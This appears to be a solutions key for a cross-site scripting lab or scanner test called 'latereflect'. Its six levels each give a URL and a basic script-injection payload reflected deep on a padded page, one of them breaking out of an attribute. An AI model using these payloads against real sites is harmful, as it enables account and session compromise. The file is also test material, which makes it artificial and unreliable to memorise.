# latereflect — solutions

Reflections placed deep on the page after large padding blocks; payload itself is unfiltered.

### latereflect-level1

`/latereflect/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<div>` after 500 chars of padding

### latereflect-level2

`/latereflect/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<p>` after 1000 chars of padding

### latereflect-level3

`/latereflect/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: input value attribute after 2000 chars of padding

### latereflect-level4

`/latereflect/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection sandwiched between two 500-char blocks

### latereflect-level5

`/latereflect/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<span>` after 3000 chars of padding

### latereflect-level6

`/latereflect/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside deep div after 5000 chars of padding
